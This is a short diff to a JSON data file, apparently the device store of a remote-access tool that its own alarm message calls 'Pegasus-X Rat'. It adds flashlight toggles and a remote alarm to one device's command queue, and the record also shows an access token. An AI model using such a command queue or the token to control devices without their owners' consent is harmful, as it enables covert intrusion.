@@ -11619,7 +11619,37 @@
     "ownerUsername": "gehgtg17",
     "token": "7fbcd2650ba9cf5ce36f05d0004ee8a1",
     "lastSeen": 1776902010196,
-    "commandQueue": [],
+    "commandQueue": [
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "on"
+        },
+        "sentAt": 1776902031697
+      },
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "off"
+        },
+        "sentAt": 1776902038856
+      },
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "on"
+        },
+        "sentAt": 1776902040680
+      },
+      {
+        "type": "trigger_alarm",
+        "payload": {
+          "message": "Pegasus-X Rat Ni Dek😹",
+          "duration": 10000
+        },
+        "sentAt": 1776902045477
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-22T23:50:06.977Z",
     "deviceInfo": {
